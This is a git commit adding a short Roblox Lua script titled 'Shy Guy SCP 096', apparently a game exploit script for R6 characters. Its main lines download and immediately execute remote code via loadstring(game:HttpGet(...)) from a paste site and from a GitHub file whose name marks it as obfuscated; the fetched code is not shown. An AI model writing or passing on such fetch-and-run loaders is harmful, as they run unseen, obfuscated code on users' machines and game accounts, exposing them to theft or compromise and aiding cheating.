9b1ba35753d830187a9ce9cf2e634af01e28e3b4
Windows7King <hugo.quintus12@gmail.com>
2025-02-12 13:32:07 +0100

    Create Shy_Guy.lua

---
+++ Shy_Guy.lua
@@ -0,0 +1,14 @@
+-- Shy Guy SCP 096
+--R6 ONLY!
+
+local humanoid = game.Players.LocalPlayer.Character.Humanoid
+
+if humanoid.RigType == Enum.HumanoidRigType.R15 then
+       print("R15 is not supported")
+       warn("R15 is not supported")
+       error("R15 is not supported")
+else
+      loadstring(game:HttpGet("https://pastefy.app/YsJgITXR/raw"))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
+
+end
